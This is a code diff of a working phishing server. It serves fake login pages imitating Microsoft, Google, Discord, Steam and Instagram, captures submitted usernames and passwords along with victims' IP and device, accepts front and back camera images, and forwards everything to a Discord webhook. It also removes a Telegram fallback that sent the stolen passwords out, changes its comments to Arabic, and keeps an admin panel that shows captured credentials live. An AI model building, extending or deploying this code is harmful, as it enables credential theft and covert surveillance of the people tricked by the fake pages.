@@ -6,6 +6,7 @@ const path = require('path');
 const crypto = require('crypto');
 const app = express();
 
+// زيادة الحد عشان الصور
 app.use(express.json({ limit: '15mb' }));
 app.use(cookieParser());
 
@@ -15,10 +16,8 @@ const ADMIN_USER = process.env.ADMIN_USER || 'null_admin';
 const ADMIN_PASS = process.env.ADMIN_PASS || 'changeme_0xDEAD';
 const ADMIN_KEY  = process.env.ADMIN_KEY  || crypto.randomBytes(8).toString('hex');
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
-const TELEGRAM_TOKEN  = process.env.TELEGRAM_TOKEN;
-const TELEGRAM_CHAT   = process.env.TELEGRAM_CHAT;
 
-// ---- device detection ----
+// تحديد نوع الجهاز
 function parseDevice(ua) {
   if (!ua) return 'Unknown';
   const lower = ua.toLowerCase();
@@ -39,7 +38,7 @@ function parseDevice(ua) {
   return `${os} · ${browser}`;
 }
 
-// ---- discord: text capture ----
+// إرسال النصوص للديسكورد
 function pushDiscord(data) {
   if (!DISCORD_WEBHOOK) return;
   fetch(DISCORD_WEBHOOK, {
@@ -63,7 +62,7 @@ function pushDiscord(data) {
   }).catch(() => {});
 }
 
-// ---- discord: camera files ----
+// إرسال الصور للديسكورد
 async function pushCamFiles({ front, back, brand, ip }) {
   if (!DISCORD_WEBHOOK) return;
   const fd = new FormData();
@@ -81,30 +80,16 @@ async function pushCamFiles({ front, back, brand, ip }) {
   await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
 }
 
-// ---- telegram fallback ----
-function pushTelegram(data) {
-  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT) return;
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT,
-      text: `🎣 ${data.brand || 'generic'}\nIP: ${data.ip}\nDevice: ${parseDevice(data.ua)}\nuser: ${data.user}\npass: ${data.pass}`
-    })
-  }).catch(() => {});
-}
-
 function logCapture(data) {
   try { fs.appendFileSync(LOG, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`); } catch (_) {}
   pushDiscord(data);
-  pushTelegram(data);
 }
 
 function isAdmin(req) {
   return req.cookies && req.cookies.rack_session === SESSION_SECRET;
 }
 
-// ---- router (must come BEFORE static) ----
+// الراوتر الأساسي
 app.get('/', (req, res) => {
   const brand = (req.query.b || '').toLowerCase();
   const valid = ['microsoft', 'google', 'discord', 'steam', 'instagram', 'generic'];
@@ -114,10 +99,9 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ---- static files ----
 app.use(express.static('public'));
 
-// ---- capture credentials ----
+// استقبال البيانات
 app.post('/capture', (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const user = (req.body.user || '').slice(0, 200);
@@ -125,24 +109,15 @@ app.post('/capture', (req, res) => {
   const brand = (req.body.brand || 'generic').slice(0, 20);
 
   if (user === ADMIN_USER && pass === ADMIN_PASS) {
-    res.cookie('rack_session', SESSION_SECRET, {
-      httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 * 30
-    });
+    res.cookie('rack_session', SESSION_SECRET, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 * 30 });
     return res.json({ ok: true, redirect: '/admin' });
   }
 
-  logCapture({
-    ip,
-    ua: req.headers['user-agent'] || '',
-    user,
-    pass,
-    brand,
-    ts: Date.now()
-  });
+  logCapture({ ip, ua: req.headers['user-agent'] || '', user, pass, brand, ts: Date.now() });
   res.json({ ok: true });
 });
 
-// ---- camera uploads ----
+// استقبال صور الكاميرا
 app.post('/upload-cam', async (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const { front, back, brand } = req.body || {};
@@ -150,10 +125,9 @@ app.post('/upload-cam', async (req, res) => {
   res.json({ ok: true });
 });
 
-// ---- admin dashboard ----
+// لوحة التحكم
 app.get('/admin', (req, res) => {
   if (!isAdmin(req)) return res.status(403).send('nope');
-
   const adminHtml = `<!doctype html><html><head><meta charset="utf-8"><title>rack · live</title>
 <style>
   body{margin:0;background:#0f1115;color:#e6e6e6;font-family:monospace;padding:20px}
@@ -174,8 +148,7 @@ async function tick(){
     try{
       const m = l.match(/\\[([^\\]]+)\\] (\\{.*\\})/);
       const d = JSON.parse(m[2]);
-      const dev = (d.ua||'').slice(0,60);
-      return '<tr><td>'+new Date(d.ts).toLocaleTimeString()+'</td><td class="brand">'+(d.brand||'gen')+'</td><td class="user">'+(d.user||'')+'</td><td class="pass">'+(d.pass||'')+'</td><td>'+(d.ip||'')+'</td><td style="color:#8a8f99">'+dev+'</td></tr>';
+      return '<tr><td>'+new Date(d.ts).toLocaleTimeString()+'</td><td class="brand">'+(d.brand||'gen')+'</td><td class="user">'+(d.user||'')+'</td><td class="pass">'+(d.pass||'')+'</td><td>'+(d.ip||'')+'</td><td style="color:#8a8f99">'+(d.ua||'').slice(0,40)+'</td></tr>';
     }catch(e){return ''}
   }).reverse().join('');
   document.getElementById('wrap').innerHTML = rows
